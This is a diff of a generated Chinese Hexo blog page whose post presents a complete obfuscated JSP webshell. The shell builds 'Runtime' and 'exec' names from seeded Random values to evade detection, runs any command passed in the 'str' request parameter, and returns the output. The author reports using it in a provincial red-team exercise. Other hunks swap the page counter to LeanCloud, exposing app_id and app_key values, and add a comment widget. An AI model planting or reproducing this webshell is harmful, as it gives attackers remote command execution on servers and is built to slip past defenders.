@@ -61,11 +61,11 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZyJbAKYmfgJXZGNkDKKBRC0i-gzGzoHsz","app_key":"WXTmIgfHD2JkbhooWMtgYW3C","server_url":"https://zyjbakym.lc-cn-n1-shared.com","path":"window.location.pathname"}},"search_path":"/local-search.xml"};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.3.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
@@ -225,9 +225,9 @@
   
     
 
-      <span id="busuanzi_container_page_pv" style="display: none">
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
         <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
+        <span id="leancloud-page-views"></span> 次
       </span>
     
   
@@ -259,12 +259,14 @@
             <div class="markdown-body">
               <p>根据pmiaowu大佬的<a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/gpy1q8/azbxxf">Java小trick之在懵逼中为Random跪下</a>整合的jsp webshell</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.commons.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br><br>&lt;%!<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> i 随机参数</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">seedConversionString</span><span class="hljs-params">(<span class="hljs-keyword">long</span> i)</span> </span>&#123;<br>        Random ran = <span class="hljs-keyword">new</span> Random(i);<br>        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>            <span class="hljs-keyword">int</span> k = ran.nextInt(<span class="hljs-number">96</span>);<br>            <span class="hljs-keyword">if</span> (k == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            sb.append((<span class="hljs-keyword">char</span>) (<span class="hljs-number">31</span> + k));<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">seedListConversionString</span><span class="hljs-params">(<span class="hljs-keyword">long</span>[] is)</span> </span>&#123;<br>        StringBuilder dataSource = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">long</span> seed : is) &#123;<br>            dataSource.append(seedConversionString(seed));<br>        &#125;<br>        <span class="hljs-keyword">return</span> dataSource.toString();<br>    &#125;<br><br><br>%&gt;<br>&lt;%<br>    String str = request.getParameter(<span class="hljs-string">&quot;str&quot;</span>);<br><br>    <span class="hljs-keyword">long</span>[] seedList = &#123;-<span class="hljs-number">2080435608</span>, -<span class="hljs-number">2060785532</span>, -<span class="hljs-number">2147149194</span>,<br>        -<span class="hljs-number">2107467938</span>, -<span class="hljs-number">1949527326</span>, -<span class="hljs-number">2146859157</span>&#125;;<br>    String random = seedListConversionString(seedList);<br>    Class randomClass = Class.forName(random);<br>    Constructor randomConstructor =<br>        randomClass.getDeclaredConstructor();<br>    randomConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>    Object randomInstance = randomConstructor.newInstance();<br><br>    <span class="hljs-keyword">long</span>[] seedList2 = &#123;-<span class="hljs-number">2146857803</span>,-<span class="hljs-number">2145923417</span>&#125;;<br>    String random2 = seedListConversionString(seedList2);<br>    Method randmoMethod = randomClass.getMethod(random2,<br>        String.class);<br>    Process p = (Process) randmoMethod.invoke(randomInstance,<br>        str);<br>    InputStream results = p.getInputStream();<br>    ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>    <span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">while</span> ((a = results.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>        baos.write(b, <span class="hljs-number">0</span>, a);<br>    &#125;<br><br>    out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + <span class="hljs-keyword">new</span> String(baos.toByteArray()) + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br><br></code></pre></div></td></tr></table></figure>
+
 <p>马儿首次用于zj省hw，效果甚好</p>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
+
                 
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
@@ -282,6 +284,16 @@
                   </div>
                 
               </div>
+              <hr>
+              <script src="https://utteranc.es/client.js"
+        repo="novysodope/novysodope.github.io"
+        issue-term="title"
+        label="Comment"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+<hr>
               
                 <p class="note note-warning">
                   
@@ -314,6 +326,7 @@
                 </div>
               
             </div>
+
 
             
           </article>
@@ -441,8 +454,8 @@
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
+  <script defer src="/js/leancloud.js" ></script>
 
 
 
